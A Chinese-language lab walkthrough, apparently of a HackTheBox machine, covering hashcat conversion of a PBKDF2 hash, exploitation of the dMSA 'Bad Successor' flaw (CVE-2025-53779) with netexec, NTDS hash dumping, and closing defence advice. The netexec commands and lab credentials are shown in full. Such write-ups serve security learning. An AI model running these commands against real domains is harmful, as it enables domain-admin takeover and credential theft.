破解 PBKDF2-SHA256 哈希

PBKDF2 哈希需要转换格式才能给 hashcat 使用：

# x.py — 格式转换脚本
import base64
hash = 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'
salt = hash.split('$')[1]
key = hash.split('$')[2]
print(f'{":".join(hash.split("$")[0].split(":")[1:])}:{base64.b64encode(salt.encode()).decode()}:{base64.b64encode(bytes.fromhex(key)).decode()}')
python3 x.py > hash
# sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=

权限提升 CVE-2025-53779 Bad Successor（dMSA 迁移伪造）

漏洞背景

dMSA（Delegated Managed Service Account） 是 Windows Server 2025 新引入的服务账户类型，支持"迁移"功能——新 dMSA 可以声明自己是某个旧账户的"接班人"，自动继承旧账户的所有权限。

迁移关系通过 AD 属性 msDS-ManagedAccountPrecededByLink 记录。KDC 在签发 TGT 时检查该属性，如果存在则将旧账户的权限附加到新 dMSA 的票据中。

CVE-2025-53779（Bad Successor）的核心问题：KDC 从不验证迁移是否经过授权。只要你能创建 dMSA 对象并设置该属性指向目标账户，KDC 就会无条件信任。

🧒 儿童版：Windows Server 2025 有一个"服务账号交接"功能。新账号在档案上写"我的前任是 Administrator"，保安队长（KDC）不核实就直接发了一把和 Administrator 一样的万能钥匙。攻击者只要能招一个"假接班人"，就能骗到域管权限。

利用条件

通过 BloodHound 分析，adam.scott 所在的 IT 组对 OU=Staff 有 CreateChild 权限——可以在该 OU 中创建新的 AD 对象（包括 dMSA）。

步骤四：创建恶意 dMSA

proxychains -q netexec ldap dc01.eighteen.htb \
  -u adam.scott -p 'iloveyou1' \
  -M badsuccessor \
  -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb' \
     DMSA_NAME=pwned \
     TARGET_ACCOUNT=Administrator

这条命令做了三件事：

操作含义
DMSA_NAME=pwned在 Staff OU 中创建名为 pwned 的 dMSA
TARGET_ACCOUNT=Administrator设置 msDS-ManagedAccountPrecededByLink 指向 Administrator
msDS-DelegatedMSAState=2标记迁移状态为"已完成"

命令成功后生成 pwned$.ccache 票据文件——这张票据包含了 Administrator 的权限。

步骤五：使用票据 dump 域哈希

KRB5CCNAME=pwned\$.ccache proxychains -q netexec smb dc01.eighteen.htb --use-kcache --ntds

步骤六：Pass-the-Hash 获取域管

⚠️ 踩坑提醒

PBKDF2 哈希需要格式转换（salt 和 key 都要 Base64 编码）才能给 hashcat -m 10900 使用

chisel 隧道是必需的——badsuccessor 模块需要从攻击机直接访问 LDAP

时间同步至关重要——Kerberos 票据签发对时间偏差非常敏感

需要使用特定分支的 NetExec（feat/refactor-badsuccessor），主线版本暂不支持

Windows Server 2025 的域功能级别是 Windows2025Domain，这是 dMSA 功能的前提条件

额外知识

dMSA 与 gMSA 的区别

特性gMSAdMSA（Windows Server 2025 新增）
密码管理系统自动轮换 120 字符随机密码同上
迁移功能❌ 无✅ 可声明"前任账户"继承权限
安全风险低（需要特定主机组才能获取密码）高（迁移链接不验证授权）

MSSQL IMPERSONATE 攻击路径

MSSQL 中 IMPERSONATE 权限允许一个登录账户模拟另一个账户的身份执行操作。常见攻击链：低权限用户 → IMPERSONATE 高权限用户 → 访问受限数据库 / 启用 xp_cmdshell / 执行系统命令。

枚举命令：enum_impersonate（impacket-mssqlclient）或 SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'。

Bad Successor 防御

微软已在 2025 年 7 月补丁中修复此漏洞。防御措施包括：安装最新安全更新；监控 dMSA 对象的创建（事件 ID 5136/5137）；限制 CreateChild 权限的授予范围；审计 msDS-ManagedAccountPrecededByLink 属性的修改。
